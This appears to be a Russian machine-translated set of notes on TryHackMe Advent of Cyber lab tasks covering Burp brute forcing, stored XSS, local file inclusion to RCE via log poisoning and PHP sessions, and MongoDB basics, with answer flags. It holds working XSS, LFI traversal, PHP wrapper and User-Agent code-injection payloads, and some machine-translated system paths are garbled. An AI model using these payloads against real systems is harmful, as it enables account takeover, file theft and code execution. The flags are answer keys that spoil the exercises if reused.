1. Запустим FireFox, перейдя в « Приложения  ->  Интернет ->  Firefox ».
2. Перейдите к форме входа в веб-браузере, используя уязвимый IP-адрес ( http://MACHINE_IP ) (обратите внимание, что 
   IP-адрес на снимках экрана является всего лишь примером, вам нужно будет заменить его на MACHINE_IP) 
3. Запустим Burp Suite, перейдя в « Приложения  ->  Другие  ->  Burp Suite ».
4. Перейдите на вкладку « Прокси »:
5. И нажмите « Перехват Вкл » в « Прокси -> Перехват ».
6.  Теперь нам нужно вернуться в наш браузер Firefox и включить расширение FoxyProxy в Firefox. Вы можете сделать 
    это, нажав на расширение « FoxyProxy » и нажав « Burp » следующим образом: 
7. Отправьте некоторые фиктивные данные в форме входа, например, как показано ниже. Обратите внимание, что 
   веб-браузер зависнет: 
8. Нам нужно будет вернуться в Burp Suite, где мы увидим, что некоторые данные теперь были возвращены нам. Щелкните 
   правой кнопкой мыши окно, содержащее данные, и нажмите « Отправить нарушителю » 
9. Перейдите на вкладку « Нарушитель » и выберите следующее:

10.1. Нажмите вкладку « Позиции»  и очистите предварительно выбранные позиции, нажав «Очистить $ ».

10.2 . Добавьте значение параметра " username " в качестве первой позиции, иногда мы уже знаем имя пользователя, 
   иногда нет. Мы можем указать Burp использовать список слов имен пользователей для этой позиции. Однако, поскольку 
   имя пользователя уже известно (т. е.  cmnatic ), мы просто перебираем пароль. (это можно сделать, выделив 
   параметр пароля и нажав " Add $ ")   

10.3 . Добавьте значение « пароля » в качестве позиции (например, password123) (это можно сделать, выделив 
   значение в параметре пароля и нажав «Добавить $ »). 

10.4. Выберите « Кассетная бомба » в раскрывающемся меню в типе атаки.

10.5. Теперь нам нужно будет предоставить некоторые значения для Burp Suite , чтобы заполнить форму входа паролями. 
   Мы можем предоставить список вручную или предоставить список слов. Я предоставлю список слов. 
11. Теперь, после выбора нашего списка слов, мы видим, что некоторые пароли заполнили окно «Параметры полезной нагрузки»:
12. Теперь давайте нажмем кнопку « Начать атаку », это начнет фаззинг формы входа. Посмотрите на результаты и 
    отсортируйте по «Длине». Неудачные пароли вернут определенную длину, а успешные пароли вернут другую длину. Вам 
    нужно будет проверить результаты с разной длиной, чтобы определить правильный пароль в сегодняшнем задании.  

Перейдите к уязвимой форме входа по адресу  http://MACHINE_IP/  и примените материал для сегодняшнего задания, чтобы 
войти в маршрут Санты , используя  имя пользователя «santa» и список паролей, расположенный на 
/root/Rooms/AoC3/Day4/passwords.txt  TryHackMe AttackBox (или загрузите его отсюда  для  своей полезной нагрузки).  


Дополнительные ресурсы
Если вам интересно узнать больше о Burp Suite, ознакомьтесь с модулем Burp Suite на TryHackMe.

### Ответить на вопросы ниже
Доступ к форме входа по адресу http://MACHINE_IP
```commandline
Ответ не нужен
```
Настройте Burp Suite и Firefox, отправьте некоторые фиктивные учетные данные и перехватите запрос. Используйте 
злоумышленника для атаки на форму входа. 
```commandline
Ответ не нужен
```
Какой действительный пароль можно использовать для доступа к учетной записи «santa»?
```commandline
cookie
```
Какой флаг есть в маршруте Санты?
```commandline
THM{SANTA_DELIVERS}
```

## Задание 10
История

Форум эльфов — это место, где все эльфы выражают свою радость и волнение по поводу Рождества, но у Grinch Enterprises есть одна плохая учетная запись администратора, и они установили плагин, который меняет все упоминания Рождества на Buttmas!! Макскиди нужно найти эту учетную запись администратора и отключить плагин.

### Цели обучения
- Что такое XSS- уязвимость?
- Какие типы XSS- уязвимостей существуют?
- Прохождение задания.
- Посмотрите видео-обучение Нахамсека на 5-й день  здесь
### Что такое XSS- уязвимость?

Межсайтовый скриптинг, более известный в сообществе специалистов по кибербезопасности как XSS , классифицируется как 
инъекционная атака, при которой вредоносный код JavaScript внедряется в веб-приложение с целью его выполнения 
другими пользователями.  

Если вы можете заставить JavaScript работать на компьютере жертвы, вы можете достичь многого. Это может 
варьироваться от кражи файлов cookie жертвы для захвата ее сеанса, запуска кейлоггера, который будет регистрировать 
каждую клавишу, нажимаемую пользователем на клавиатуре во время посещения веб-сайта, перенаправления пользователя на 
совершенно другой веб-сайт или выполнения какого-либо действия на веб-сайте, например, размещения заказа или сброса 
пароля и т. д.



Какие типы XSS- уязвимостей существуют?

Уязвимости XSS делятся на четыре типа: DOM, Reflected, Stored и Blind. Каждый тип — это довольно сложная тема, 
которую мы попытаемся кратко осветить здесь, но чтобы получить более глубокое понимание, вы можете попробовать эту 
комнату после завершения испытания  https://tryhackme.com/room/xssgi  

### ДОМ:

DOM означает  Document Object Model  и  является программным интерфейсом для документов HTML и XML . Он представляет 
страницу, чтобы программы могли изменять структуру документа, его стиль и содержимое. Веб-страница — это документ, 
и этот документ может быть отображен в окне браузера или как исходный HTML-код.  

DOM Based XSS — это когда выполнение JavaScript происходит непосредственно в браузере без загрузки новых страниц или 
отправки данных в код бэкенда. Выполнение происходит, когда код JavaScript веб-сайта реагирует на ввод или 
взаимодействие с пользователем. Примером этого может быть код JavaScript веб-сайта, получающий содержимое из 
параметра  window.location.hash, а затем записывающий его на страницу в просматриваемом в данный момент разделе. 
Содержимое хеша не проверяется на наличие вредоносного кода, что позволяет злоумышленнику внедрить JavaScript по 
своему выбору на веб-страницу.     

### Отражено:
Отраженный XSS происходит, когда пользовательские данные в  HTTP-  запросе включаются в исходный код веб-страницы 
без какой-либо проверки. Примером этого может быть сообщение об ошибке в строке запроса URL, который отражается на 
веб-странице. URL может выглядеть примерно так:  

https://website.thm/login?error=Имя пользователя%20%20Неверно

Сообщение об ошибке можно заменить кодом JavaScript, который выполняется, когда пользователь посещает страницу.

### Сохранено:
Как следует из названия, полезная нагрузка XSS хранится в веб-приложении (например, в базе данных), а затем 
запускается, когда другие пользователи посещают сайт или веб-страницу. Этот тип XSS может быть особенно 
разрушительным из-за количества жертв, которые могут быть затронуты. Примером этого может быть блог, который 
позволяет посетителям оставлять комментарии. Если сообщение посетителя не проверено должным образом и не имеет 
полезных нагрузок XSS , то каждое последующее посещение страницы блога будет запускать вредоносный код JavaScript.    

### Слепой:
Blind XSS похож на сохраненный XSS в том, что ваша полезная нагрузка сохраняется на веб-сайте для просмотра другим 
пользователем, но в этом случае вы не можете увидеть, как работает полезная нагрузка, или протестировать ее на себе. 
Примером этого может быть контактная форма. В контактной форме ваше сообщение может содержать полезную нагрузку XSS, 
которая выполняется, когда сотрудник просматривает сообщение.   

### Прохождение задания

Нажмите зеленую кнопку «Запустить машину» в правом верхнем углу этой задачи. После загрузки машины нажмите следующую 
ссылку: 
https://LAB_WEB_URL.p.thmlabs.com  (если вы получили сообщение об ошибке, подождите 30 секунд и попробуйте обновить 
страницу) 

Здесь вы найдете форум эльфов, где они говорят о Рождестве и распространяют радость! Когда вы исследуете форум и 
нажимаете на различные темы и ветки, вы заметите, что каждое упоминание Рождества было изменено на Buttmas! Это 
потому, что у Гринча есть учетная запись администратора и он установил плагин, который меняет каждое упоминание 
Рождества на Buttmas! Вам нужно будет захватить учетную запись Гринча и отключить плагин, чтобы восстановить 
рождественскую радость!    

Сначала нажмите ссылку входа в верхней части страницы и войдите в систему, используя следующие учетные данные:


Имя пользователя:  McSkidy
Пароль:  пароль

Теперь, когда вы вошли в систему, вы заметите, что панель навигации изменилась с «Вход» на «Настройки» и «Выход».

Нажмите на ссылку «Настройки», и вы увидите функцию для изменения пароля входа McSkidy. Попробуйте изменить свой 
пароль на  pass123 . Когда вы это сделаете, вы заметите, что ваша адресная строка изменится и будет выглядеть так, 
как на скриншоте ниже (вместо этого у вас будет IP-адрес MACHINE_IP). Если вам удастся каким-то образом обмануть 
Гринча, заставив его посетить этот URL, он изменит свой пароль на  pass123 .   

Давайте теперь вернемся на форум и посетим одну из тем. Если вы прокрутите страницу вниз, то увидите, что можете 
оставить комментарий. Попробуйте оставить следующий комментарий: 

`hello <u>world</u>`

После публикации комментария вы увидите, что слово «мир» подчеркнуто.



Это означает, что комментарий отображается так, как вы его написали, без удаления подчеркивания HTML-тегов. 
Поскольку это не удаляется, вы можете попробовать HTML-теги скриптов вместо этого, чтобы увидеть, будет ли веб-сайт 
выполнять любой введенный JavaScript.  

Используя URL-адрес, который вы нашли ранее для изменения пароля пользователя, вы можете попробовать следующую 
полезную нагрузку: 

`<script>fetch('/settings?new_password=pass123');</script>`

Тег  <script> сообщает браузеру, что мы хотим запустить некий JavaScript, и  fetch команда отправляет сетевой запрос 
на указанный URL. 

После публикации вышеизложенного в качестве комментария вы можете просмотреть исходный код веб-страницы, чтобы 
убедиться, что он отображается правильно. Скриншот ниже показывает нам, что теги скрипта не удаляются и не 
отключаются и, по сути, работают:  



Теперь, когда на форуме запущен этот XSS, это означает, что любой вошедший в систему пользователь, просматривающий 
ветку, автоматически сменит свой пароль на pass123. Итак, давайте выйдем из системы и посмотрим, посетил ли Гринч 
ветку, попытавшись войти под ним (может пройти около минуты, прежде чем Гринч посетит страницу и его пароль изменится).  

Имя пользователя:  Гринч
Пароль:  pass123

После входа в систему снова перейдите на страницу настроек, и на этот раз вы обнаружите еще одну функцию с 
возможностью отключения плагина Christmas to Buttmas. 

Отключите плагин, и вы получите флаг, который можно ввести ниже.

### Ответить на вопросы ниже
Какой флаг вы получили, когда отключили плагин?
```commandline
THM{NO_MORE_BUTTMAS}
```
## Задание 11
Во время планового аудита безопасности перед инцидентом Макскиди обнаружила некоторые пароли восстановления на 
старом сервере. Она создала тикет для вывода этого сервера из эксплуатации, чтобы уменьшить эту уязвимость 
безопасности. Эльф, назначенный для исправления этой уязвимости, продолжал откладывать задачу, и это так и не было 
сделано. К счастью, некоторые из этих ключей восстановления можно использовать для спасения некоторых систем.

К сожалению, единственный способ доступа к серверу — через старое веб-приложение. Попробуйте вытащить эти ключи 
восстановления, чтобы помочь Макскиди в ее стремлении спасти Рождество. 

Посмотрите видео-обучение HuskyHacks на 6-й день  здесь
В этом задании мы рассмотрим основы уязвимости локального включения файлов ( LFI ), включая то, как идентифицировать 
и тестировать LFI . Мы также покажем влияние уязвимости LFI , эксплуатируя ее. 

Давайте начнем с запуска машины, подключенной к этой задаче,


Что такое уязвимость локального включения файлов ( LFI )?

Уязвимость  LFI обнаружена в различных веб-приложениях. Например, в PHP  следующие функции  вызывают такую уязвимость: 

включать
требовать
включить_один раз 
требуется_один раз 
Это уязвимость веб-приложения, которая позволяет злоумышленнику включать и читать локальные файлы на сервере. Эти файлы могут содержать конфиденциальные данные, такие как криптографические ключи, базы данных, содержащие пароли, и другие личные данные.  Уязвимость LFI   возникает  из-за отсутствия у разработчика знаний о безопасности.  В некоторых случаях разработчикам необходимо включить содержимое других локальных файлов на определенную страницу. Предположим, что разработчик включает файлы без надлежащей проверки ввода. В этом случае уязвимость LFI будет существовать, поскольку разработчик никогда не должен доверять пользовательскому вводу и фильтровать и очищать все вводимые пользователем данные.  Основная проблема этих уязвимостей заключается в отсутствии проверки ввода, при которой вводимые пользователем данные не очищаются и не проверяются, а пользователь контролирует их.

Каков риск LFI ?

После обнаружения  уязвимости LFI  можно прочитать конфиденциальные данные, если у вас есть разрешения на чтение 
файлов. Таким образом, одним из самых существенных рисков является утечка конфиденциальных данных, к которым имеет 
доступ обычный пользователь. Кроме того, в некоторых случаях  уязвимость LFI  может быть связана с выполнением  RCE 
удаленного выполнения кода  на сервере. Если мы можем внедрить или записать файл в системе, мы используем LFI для 
получения RCE. В этой задаче мы подготовили веб-приложение с уязвимостью  LFI  и возможным способом получения  RCE. 
Мы рассмотрим это веб-приложение позже.     

Выявление и тестирование LFI

Обычно злоумышленники интересуются параметрами HTTP для манипулирования входными данными и внедрения полезных 
нагрузок атаки, чтобы увидеть, как ведет себя веб-приложение. В общем, если вы ищете  точку входа  для тестирования  
типов атак веб-приложений , то важно использовать веб-приложение и проверить его функциональность. Точкой входа 
могут быть параметры HTTP  GET  или  POST  , которые передают аргумент или данные в веб-приложение для выполнения 
определенной операции.       

Параметры  — это строки параметров запроса, прикрепленные к URL, которые могут использоваться для извлечения данных 
или выполнения действий на основе ввода пользователя.  Следующий график объясняет и разбивает основные части URL. 



Например, параметры используются в поиске Google, где запросы GET передают пользовательский ввод в поисковую 
систему.  https://www.google.com/search?q=TryHackMe. Если вы не знакомы с темой, вы можете просмотреть модуль «Как 
работает Интернет», чтобы понять концепцию.    

Как только вы найдете точку входа, нам нужно понять, как эти данные могут быть обработаны в приложении. После этого 
момента вы можете начать тестирование на определенные типы уязвимостей с помощью ручных или автоматизированных 
инструментов. Ниже приведен пример PHP- кода, уязвимого для LFI.   


<?PHP 
	include($_GET["file"]);
?>
PHP - код выше использует запрос GET через файл параметров URL для включения файла на страницу.  Запрос можно 
сделать, отправив следующий HTTP- запрос: http://example.thm.labs/index.php?file=welcome.txt для загрузки 
содержимого файла welcome.txt, который находится в том же каталоге.     

Кроме того, в зависимости от веб-приложения могут использоваться и другие точки входа, где можно учитывать 
User-Agent, файлы cookie, сеанс и другие заголовки HTTP. 

Теперь, когда мы нашли точку входа, давайте начнем тестирование чтения локальных файлов, связанных с операционной 
системой. Ниже приведены некоторые системные файлы Linux, которые содержат конфиденциальную информацию. 

/etc/проблема
/etc/пароль
/etc/тень
/etc/группа
/etc/хосты
/etc/motd
/etc/mysql/my.cnf
/proc/[0-9]*/fd/[0-9]* (первая цифра — это PID , вторая — дескриптор файла)
/proc/self/окружение
/proc/версия
/proc/командная_строка

Давайте начнем с базового тестирования LFI. Как только мы определим точку входа или параметр HTTP, мы можем начать 
тестирование и включить файлы ОС, чтобы увидеть, как отреагирует веб-приложение. В качестве тестового случая мы 
всегда можем попробовать /etc/passwd против ОС Linux , поскольку он наверняка доступен для чтения. Мы также можем 
попробовать включить, используя различные методы, такие как   

Прямое включение файла, которое начинается с  /etc/passwd
при использовании  ..  для выхода из текущего каталога количество  ..  зависит от каталога веб-приложения. 
Обход фильтров с помощью  ....// .
Методы кодирования URL  (например, двойное кодирование)
 Более подробную информацию об этих методах можно найти в  разделе «Включение файлов» .

  http://example.thm.labs/page.php?file=/etc/passwd http://example.thm.labs/page.php?file=../../../../../../etc/passwd 
http://example.thm.labs/page.php?file=../../../../../../etc/passwd%00 
http://example.thm.labs/page.php?file=....//....//....//....//etc/passwd 
http://example.thm.labs/page.php?file=%252e%252e%252fetc%252fpasswd
После успешного просмотра содержимого файла  /etc/passwd можно приступить к проверке других файлов. 

Теперь запустите присоединенную машину, используя зеленую кнопку Start Machine в этой задаче, и примените то, что мы 
обсуждали до сих пор, и ответьте на вопросы ниже.  Чтобы получить доступ к веб-сайту, вы можете либо развернуть 
AttackBox, либо посетить следующую ссылку веб-сайта: https://LAB_WEB_URL.p.thmlabs.com.  

### Использование LFI

Использование LFI иногда ограничено и зависит от конфигурации сервера веб-приложений. Помимо чтения конфиденциальных 
данных, часто мы можем получить удаленное выполнение кода.  Если мы имеем дело с веб-приложением PHP , то мы можем 
использовать поддерживаемую PHP оболочку . Для получения дополнительной информации посетите  страницу руководства 
PHP . PHP предоставляет различные методы передачи данных (поток ввода/вывода), чтобы позволить PHP читать. Это 
позволит читать данные через различные каналы типов данных.    

### PHP- фильтр

Обертка фильтра PHP используется в LFI для чтения фактического содержимого страницы PHP. В типичных случаях 
невозможно прочитать содержимое файла PHP через LFI, поскольку файлы PHP выполняются и никогда не показывают 
существующий код. Однако мы можем использовать фильтр PHP для отображения содержимого файлов PHP в других форматах 
кодировки, таких как  base64  или  ROT13 .    

Давайте сначала попробуем прочитать  файл /etc/passwd  с помощью PHP- оболочки фильтра.

  http://example.thm.labs/page.php?file=php://filter/resource=/etc/passwd
Теперь попробуйте прочитать  файл index.php  с помощью фильтра PHP; мы получим ошибки, потому что веб-сервер 
  попытается выполнить код PHP. Чтобы избежать этого, мы можем использовать фильтр PHP,  кодируя вывод base64 или  
  ROT13  следующим образом:    

http://example.thm.labs/page.php?file=php://filter/read=string.rot13/resource=/etc/passwd 
http://example.thm.labs/page.php?file=php://filter/convert.base64-encode/resource=/etc/passwd
Мы попробуем использовать base64 для нашего сценария. В результате мы получим   следующий вывод в кодировке base64 :

cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDox******Deleted
Чтобы прочитать этот текст как обычный текст, вы можете использовать терминал Linux или один из веб-сайтов, которые 
выполняют декодирование онлайн, например,  www.base64decode.org . 

Теперь попробуйте извлечь  содержимое index.php  и ответить на вопрос №3 ниже .

ДАННЫЕ PHP

Обертка PHP используется для включения необработанного простого текста или данных в кодировке base64. Она 
используется для включения изображений на текущей странице. Она используется в эксплойте  LFI . 

Давайте попробуем закодировать текст «AoC3 is fun!» в формате base64, чтобы включить его в страницу с помощью 
данных-оболочки: 
Терминал
```user@machine$ echo "AoC3 is fun!" | base64 QW9DMyBpcyBmdW4hCg==```
Также мы могли бы декодировать base64 следующим образом:

Терминал
`user@machine$ echo "QW9DMyBpcyBmdW4hCg==" | base64 --decode AoC3 is fun!`
 
Теперь мы можем включить наши данные base64 в уязвимую страницу следующим образом:
http://example.thm.labs/page.php?file=data://text/plain;base64,QW9DMyBpcyBmdW4hCg==
В результате страница покажет наше прекрасное сообщение, которое  AoC3 is fun! . Используя эту технику, мы можем 
включить PHP- код в страницу, кодируя требуемый PHP- код и включая его в PHP- оболочку данных.  Вы можете провести 
небольшое исследование, чтобы проверить их!  

Другие PHP- обертки могут использоваться в уязвимости LFI . Вы можете провести исследование, чтобы проверить их!

Как мы уже упоминали, мы можем получить удаленное выполнение команд, если у нас есть возможность записать в файл или 
связать его с другими типами уязвимостей. В этой задаче мы будем использовать уязвимое веб-приложение, которое мы 
предоставили для выполнения RCE через LFI .  

### LFI в RCE через файлы журналов

Это также называется атакой отравления журнала. Это метод, используемый для получения удаленного выполнения команд 
на веб-сервере. Злоумышленнику необходимо включить вредоносную полезную нагрузку в файлы журналов служб, таких как 
Apache, SSH и т. д. Затем уязвимость LFI используется для запроса страницы, которая включает вредоносную полезную 
нагрузку.  Эксплуатация этого вида атаки зависит от различных факторов, включая дизайн веб-приложения и конфигурации 
сервера. Таким образом, это требует перечислений, анализа и понимания того, как работает веб-приложение.  Например, 
пользователь может включить вредоносную полезную нагрузку в файл журнала Apache через User-Agent или другие 
заголовки HTTP . В SSH пользователь может внедрить вредоносную полезную нагрузку в раздел имени пользователя.       

В этой задаче мы предоставили уязвимое веб-приложение, которое регистрирует запросы пользователей в файле журнала, к 
которому пользователь веб-сервера имеет доступ.  После входа в веб-приложение мы можем посетить страницу журнала по 
адресу  https://LAB_WEB_URL.p.thmlabs.com/logs.php .  



Мы видим, что страница журнала хранит четыре разных заголовка, включая имя пользователя, IP-адрес,  User-Agent и 
посещенную страницу.  User  -Agent — это заголовок HTTP, который включает информацию о браузере пользователя, чтобы 
серверы могли идентифицировать тип операционной системы, поставщика и версию.  User  -Agent — это один из заголовков 
HTTP , который может контролировать пользователь.  Поэтому,  чтобы получить RCE, вам нужно включить PHP- код в  
User-Agent  и отправить запрос в файл журнала с помощью LFI для выполнения в браузере. Теперь давайте проверим, 
можем ли мы включить значение User-Agent в файл журнала веб-приложения, и посмотрим, будет ли записана наша запись!        


Терминал
`user@machine$ curl -A "This is testing" http://LAB_WEB_URL.p.thmlabs.com/login.php`
После отправки HTTP- запроса с помощью curl (теперь уже с использованием зарегистрированного пользователя) мы можем 
проверить страницу журнала, чтобы увидеть, можем ли мы добавить отправленный нами User-Agent. 




Отлично! мы смогли включить нужное нам значение User-Agent. Теперь давайте  внедрим PHP- код в User-Agent с помощью 
браузера, терминалов или веб-прокси, таких как Burp Suite . В этой задаче мы покажем, как включить наш код в журнал 
веб-приложения с помощью терминала следующим образом:  
Терминал
`user@machine$ curl -A "<?php phpinfo();?>" http://LAB_WEB_URL.p.thmlabs.com/login.php`
Теперь, используя LFI, загрузите файл журнала, чтобы получить выполнение кода PHP. Обратите внимание, что важно 
посетить файл журнала через LFI. После вызова файла журнала мы увидим страницу информации PHP. 



Теперь время практики. Мы должны применить то, что мы обсуждали, чтобы получить RCE. Мы должны включить PHP- код в 
User-Agent, а затем использовать уязвимость LFI, называемую файлом журнала, чтобы ваш PHP- код был выполнен, затем 
ответить на вопрос ниже.  

### LFI в RCE через PHP- сессии

LFI to RCE через сеансы PHP следует той же концепции техники отравления журнала. Сеансы PHP — это файлы в 
операционной системе, которые хранят временную информацию. После выхода пользователя из веб-приложения информация 
сеанса PHP будет удалена.  

Этот метод требует перечисления для чтения файла конфигурации PHP , а затем мы узнаем, где находятся файлы сессий 
PHP . Затем мы включаем код PHP в сессию и, наконец, вызываем файл через LFI .  PHP хранит данные сессии в файлах в 
системе в разных местах в зависимости от конфигурации. Ниже приведены некоторые из распространенных мест, в которых 
хранится PHP :   

c:\Windows\Temp
/тмп/
/var/lib/php5
/var/lib/php/сессия

Как только злоумышленник обнаружит, где PHP хранит файл сеанса, и сможет контролировать значение своего сеанса, он 
сможет использовать его для цепной атаки с LFI , чтобы получить удаленное выполнение команд.  

Если мы перечислим и прочитаем конфигурацию PHP уязвимого веб-приложения, которое мы предоставили, мы увидим, что 
оно сохраняет сеансы PHP в каталоге  /tmp  . Оно также сохраняет значение имени пользователя в сеансе, даже если вы 
не вошли в систему, поскольку это значение необходимо разработчику для использования его в функции журналов. Мы 
внедряем код PHP в раздел пользователя на следующем рисунке, сохраненный в файле сеанса PHP .



Чтобы найти имя файла сеанса PHP, PHP по умолчанию использует следующую схему именования:  sess_<SESSION_ID>  , где 
мы можем найти  SESSION_ID  с помощью браузера и проверки файлов cookie, отправленных с сервера. 

Чтобы найти идентификатор сеанса в браузере, вы можете открыть инструменты разработчика (SHIFT+CTRL+I), затем 
вкладку Приложение. В левом меню выберите Файлы cookie и выберите целевой веб-сайт. Есть PHPSESSID  и   значение. В 
моем случае значение равно  vc4567al6pq7usm2cufmilkm45. Следовательно, файл будет иметь вид  
sess_vc4567al6pq7usm2cufmilkm45. Наконец, мы знаем, что он хранится в  /tmp.  Теперь мы можем использовать LFI для 
вызова файла сеанса.



https://LAB_WEB_URL.p.thmlabs.com/login.php?err=/tmp/sess_vc4567al6pq7usm2cufmilkm45
В результате у нас будет PHP- код, который мы вставили в файл имени пользователя, показанный на странице. Теперь 
примените то, что мы обсуждали, чтобы получить RCE на веб-сервере, используя LFI для RCE через сеансы PHP. Теперь 
ваша очередь попытаться получить RCE через сеанс PHP.  


Дополнительные ресурсы
Если вам интересно узнать больше об уязвимостях включения файлов, посетите  раздел, посвященный включению файлов,  
на TryHackMe. 

### Ответить на вопросы ниже
Разверните присоединенную виртуальную машину и осмотритесь. Какова точка входа для нашего веб-приложения?

```commandline
err
```
Используйте точку входа для выполнения  LFI для чтения  файла /etc/flag . Что такое флаг?  


```commandline
THM{d29e08941cf7fe41df55f1a7da6c4c06}
```
Используйте технику фильтра PHP для чтения исходного кода index.php  . Каково  значение  переменной  $flag ?


```commandline
THM{791d43d46018a0d89361dbf60d5d9eb8}
```
McSkidy забыл свои учетные данные для входа. Можете ли вы помочь ему войти, чтобы восстановить один из паролей сервера?

Теперь, когда вы прочитали  index.php , есть путь к файлу PHP для входа в систему. Используйте технику фильтрации 
PHP, чтобы прочитать его содержимое. Каковы имя пользователя и пароль? 


```commandline
McSkidy:A0C315Aw3s0m
```
Используйте учетные данные для входа в веб-приложение. Помогите McSkidy восстановить пароль сервера. Какой пароль у  
сервера flag.thm.aoc  ?  


```commandline
THM{552f313b52e3c3dbf5257d8c6db7f6f1}
```
Веб-приложение регистрирует все запросы пользователей, и только авторизованные пользователи могут читать файл 
журнала. Используйте LFI для получения RCE через страницу файла журнала. Каково имя хоста веб-сервера? Расположение 
файла журнала:  ./includes/logs/app_access.log .  


```commandline
lfi-aoc-awesome-59aedca683fff9261263bb084880c965
```
Бонус: Текущая конфигурация PHP хранит файлы сеанса PHP в  /tmp . Используйте LFI для вызова файла сеанса PHP, чтобы 
выполнить ваш код PHP.  
```commandline
Ответ не нужен
```

## Задание 12
Команда разработчиков, которая обрабатывает запросы на подарки от Children, перешла на новый технологический стек. 
При этом они оставили свое приложение уязвимым, и Grinch Enterprises теперь контролирует доступ к системе. К счастью,
Grinch Enterprises забыли исправить систему, так что вы можете использовать ту же уязвимость для получения запросов 
на подарки для студентов.   

Посмотрите видео-обучение Tib3rius на 7-й день здесь
Обратите внимание : видео-прохождение использует доступ в браузере для завершения комнаты. Инструкции в задании 
немного отличаются и используют AttackBox /OpenVPN для ssh входа в целевую машину.

Цели обучения
- Что такое NoSQL?
- Понимание базы данных NoSQL
- Понять, почему появляется NoSQL
- Понять, что такое NoSQL-инъекция
- Использование NoSQL-инъекции для обхода формы входа
### Что такое NoSQL

База данных NoSQL относится к нереляционной базе данных, что является сокращением от  non SQL  и  Not only SQL . Это 
система хранения и извлечения данных. Базы данных NoSQL в настоящее время широко используются для больших данных и 
устройств IoT из-за их мощных функций, таких как быстрые запросы, простота использования для разработчиков, легкое 
масштабирование и гибкая структура данных.    

Сегодня мы рассмотрим основные концепции баз данных NoSQL, а также сбор информации, ее перечисление и эксплуатацию 
уязвимостей NoSQL. 

### Понимание NoSQL

Могут быть охвачены различные типы баз данных NoSQL, включая  MongoDB, Couchbase, RavenDB и т. д. Однако в этой 
задаче мы сосредоточимся на базе данных MongoDB  — бесплатной и популярной базе данных NoSQL для хранения документов.   

Подобно реляционным базам данных (таким как MySQL и MSSQL), MongoDB состоит из баз данных, таблиц, полей, но с 
другими именами, где  
- Коллекции  аналогичны таблицам или представлениям в MySQL и MSSQL.
- Документы  аналогичны строкам или записям в MySQL и MSSQL.
- Поля  аналогичны столбцам в MySQL и MSSQL.
Следующий график показывает визуальный пример этих терминов, поскольку у нас есть база данных с именем AoC3 , в 
  которой есть две коллекции: пользователи, роли.  Коллекция пользователей содержит два документа (2 записи). 
  Документы в MongoDB — это объекты, хранящиеся в формате  BSON , который поддерживает  типы данных JSON для 
  хранения документов.       


Также полезно кратко рассмотреть и сравнить  операторы  запросов в MongoDB и MySQL:
- $and  эквивалентно  AND  в MySQL
- $или  эквивалент  OR  в MySQL
- $eq  эквивалентно  =  в MySQL

### Взаимодействие с сервером MongoDB
Примечание : Чтобы продолжить взаимодействие с сервером MongoDB, разверните подключенную машину и используйте 
AttackBox или подключитесь к VPN, чтобы войти на сервер SSH. Используйте следующие учетные данные:thm:tryhackme. 

Терминал
```commandline
user@machine$ ssh thm@MACHINE_IP -p 2222
```

Прежде чем мы погрузимся в детали NoSQL-инъекции, важно понять, как работает MongoDB в общем смысле. Давайте начнем 
с подключения к MongoDB на нашей развернутой целевой машине с использованием порта по умолчанию  27017. Мы создадим 
новую базу данных и коллекции, а также документы.   

```commandline
MongoDB
user@machine$ mongo
connecting to: mongodb://127.0.0.1:27017/?compressors=disabled&gssapiServiceName=mongodb
Implicit session: session { "id" : UUID("1273eab2-4dae-42a8-8f67-a133b870872b") }
MongoDB server version: 4.4.10
```

Теперь давайте воспользуемся  командой show, чтобы вывести список всех баз данных, которые есть в MongoDB на нашей 
целевой машине: 
```commandline
MongoDB
> show databases
admin     0.000GB
config    0.000GB
local     0.000GB
logindb   0.000GB
thm-test  0.000GB
thmdb     0.000GB
```

Далее, если мы хотим подключиться к базе данных, мы можем сделать это с помощью команды use. Однако мы также 
покажем, как создать новую базу данных с коллекциями и данными. Чтобы создать новую базу данных, мы также используем 
ту же команду use для ее создания и подключения к ней. Таким образом, команда use используется для подключения 
к базе данных, если она существует, или создания новой, если ее нет.  После создания базы данных мы можем создать 
две новые коллекции, названные пользователями и ролями, с помощью функции db.createCollection(), а затем 
показать все доступные коллекции в базе данных.
```commandline
MongoDB
> use AoC3
switched to db AoC3
> db.createCollection("users")
{ "ok" : 1 }
> db.createCollection("roles")
{ "ok" : 1 }
> db.getCollectionNames();
[ "roles", "users" ]
```

Далее мы создаем документ в  коллекции пользователей  и вставляем в него данные.
```commandline
MongoDB
> db.users.insert({id:"1", username: "admin", email: "admin@thm.labs", password: "idk2021!"})
WriteResult({ "nInserted" : 1 })
> db.users.insert({id:"2", username: "user", email: "user@thm.labs", password: "password1!"})
WriteResult({ "nInserted" : 1 })
>
> db.users.find()
{ "_id" : ObjectId("6183dc871ebe3f0c4b779a31"), "id" : "1", "username" : "admin", "email" : "admin@thm.labs", "password" : "idk2021!" }
{ "_id" : ObjectId("6183dc911ebe3f0c4b779a32"), "id" : "2", "username" : "user", "email" : "user@thm.labs", "password" : "password1!" }
```

Мы успешно создали два документа в  коллекции пользователей  , а затем отобразили доступные документы в коллекции с помощью  db.users.find() . Обратите внимание, что MongoDB автоматически создает уникальный идентификатор с именем  _id  для каждого документа в коллекции из приведенного выше вывода. Давайте также попробуем обновить документ, а также удалить его с помощью команд MongoDB. Мы будем использовать функцию  db.<collection>.update   для обновления документа с  id=2  и обновления имени пользователя на  tryhackme  и, наконец, отобразим все документы, чтобы убедиться, что наш документ обновлен.
```commandline
MongoDB
> db.users.update({id:"2"}, {$set: {username: "tryhackme"}});
WriteResult({ "nMatched" : 1, "nUpserted" : 0, "nModified" : 1 })
> db.users.find()
{ "_id" : ObjectId("6183dc871ebe3f0c4b779a31"), "id" : "1", "username" : "admin", "email" : "admin@thm.labs", "password" : "idk2021!" }
{ "_id" : ObjectId("6183dc911ebe3f0c4b779a32"), "id" : "2", "username" : "tryhackme", "email" : "user@thm.labs", "password" : "password1!" }
```

Наконец, давайте удалим документ с помощью  db.users.remove()  , а затем удалит  коллекцию с помощью db.users.drop() следующим образом:  
```commandline
MongoDB
> db.users.remove({'id':'2'})
WriteResult({ "nRemoved" : 1 })
> db.users.find()
{ "_id" : ObjectId("6183dc871ebe3f0c4b779a31"), "id" : "1", "username" : "admin", "email" : "admin@thm.labs", "password" : "idk2021!" }
> db.users.drop()
true
```

Теперь, когда мы знаем, как взаимодействовать с сервером MongoDB, оглядитесь вокруг, используя изученные нами 
команды MongoDB, и найдите флаг, чтобы ответить на вопрос 1! 

### Что такое NoSQL-инъекция?

